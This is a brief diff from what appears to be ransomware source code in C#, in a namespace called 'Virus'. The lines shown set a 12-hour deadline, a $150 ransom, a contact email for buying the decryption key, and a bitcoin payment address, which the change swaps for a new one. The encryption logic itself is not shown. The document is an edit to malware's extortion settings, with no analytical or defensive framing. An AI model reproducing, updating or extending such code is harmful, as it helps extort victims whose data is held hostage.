@@ -18,7 +18,7 @@ namespace Virus
         public static int _timetopay = 12;
         public static string _ransomAmount = "$150";
         public static string _safeEmail = "getyourprivkey@protonmail.com";
-        public static string _bitcoinAddress = "16YzUQfVeZpKoSpPeTyUgBRmBdfg8ABHZp";
+        public static string _bitcoinAddress = "bc1qqv0lzkutl9nqgf38xy5kne6yw2vd6r7jfwjd0a";
         public DateTime DateTimePlus12Hours;
 
         /// <summary>
